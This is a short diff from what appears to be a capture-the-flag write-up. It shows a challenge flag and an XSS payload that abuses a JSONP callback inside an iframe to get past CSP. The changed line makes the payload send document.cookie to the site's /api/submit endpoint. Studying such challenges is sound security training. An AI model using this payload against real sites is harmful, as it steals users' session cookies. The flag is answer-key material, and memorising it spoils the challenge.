@@ -186,7 +186,7 @@ CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}
 
 <iframe src="/list?callback=var xhttp = new XMLHttpRequest();
 xhttp.open('POST', '/api/submit', true);
-const json = {'complaint':'asdf'};
+const json = {'complaint':"'"+document.cookie+"'"};
 xhttp.setRequestHeader('Content-type', 'application/json');
 xhttp.send(JSON.stringify(json));"></iframe>
 ```
